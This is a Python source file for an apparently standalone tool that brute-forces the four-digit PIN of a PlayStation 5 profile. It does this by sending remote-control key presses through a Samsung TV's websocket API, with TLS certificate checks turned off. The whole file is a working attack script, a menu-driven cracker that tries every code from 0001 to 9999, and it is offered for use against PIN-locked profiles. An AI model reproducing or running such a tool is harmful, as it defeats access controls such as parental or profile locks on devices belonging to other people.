import base64
import json
import logging
import time
import websocket
import ssl
from websocket import create_connection

class SamsungTV:
    def __init__(self, host, port=8002, name="ps_remote", token=None):
        try:
            uri = f"wss://{host}:{port}/api/v2/channels/samsung.remote.control?name={base64.b64encode(name.encode('utf-8')).decode('utf-8')}"
            uri += f"&token={token}"
            self.connection = create_connection(uri, sslopt={"cert_reqs": ssl.CERT_NONE})

            if token is None:
                # Receive and print the response for debugging
                response = json.loads(self.connection.recv())
                token = response["data"]["token"]

                if response['event'] != 'ms.channel.connect':
                    self.close()
                    raise Exception(f"Unexpected event: {response['event']}")

                try:
                    with open("token.txt","w") as token_file:
                        token_file.write(token)
                except:
                    print("Unable to create a file!")

            self.token = token
        except:
            print("Unable to connect! make sure of the tv ip and port.")
    
    def _exit_(self, type, value, traceback):
        self.close()

    def close(self):
        if self.connection:
            self.connection.close()
            self.connection = None

    def get_token(self):
        return self.token

    def send_key(self, key):
        payload = json.dumps({'method': 'ms.remote.control', 'params': {'Cmd': 'Click', 'DataOfCmd': key, 'Option': 'false', 'TypeOfRemote': 'SendRemoteKey'}})
        self.connection.send(payload)
        time.sleep(0.2)

    # the pin cracker function
    def crack(self):
        for i in range(1,10000):
            num = f"{i:04d}"
            self.send_key(f"KEY_{num[0]}")
            self.send_key(f"KEY_{num[1]}")
            self.send_key(f"KEY_{num[2]}")

            self.send_key(f"KEY_{num[3]}")
            time.sleep(0.3)
            self.send_key("KEY_ENTER")
            print (num)

def main():
    token=""
    tv = ""

    menue = "1-Enter your tv information\n2-Start bruteforcing\n3-Instruction page\n4-Exit"
    print(menue)

    try:
        ch = int(input("Enter you option:"))
    except:
        print("Invalid option!")

    while(ch != 4):
        # the main menue

        if ch == 1:
            token = ""
            ip = input("pleas Enter you tv ip:")
            port = int(input("the tv port (try 8002 as it is the default):"))

            try:
                with open("token.txt","r") as token_file:
                    token = token_file.read()
            except:
                print("click allow when prompted!")

            if len(token) == 0:
                tv = SamsungTV(ip, token=None,port=port)
            else:
                tv = SamsungTV(ip, token=token,port=port)
        elif ch == 2:
            if tv != "":
                print("pleas point click on the profile you want to crack!")
                print("will start in 5 seconeds...")

                time.sleep(5)
                tv.crack()
            else:
                print("provide the tv information first!")
        elif ch == 3:
            print("visit: https://github.com/coderMohammed1/PS-5-PIN-cracker")
            
        else:
            print("Invalid option")

        print(menue)
        try:
            ch = int(input("Enter you option:"))
        except:
            print("Invalid option!")

if __name__ == "__main__":
    try:
        main()
    except:
        print("error")
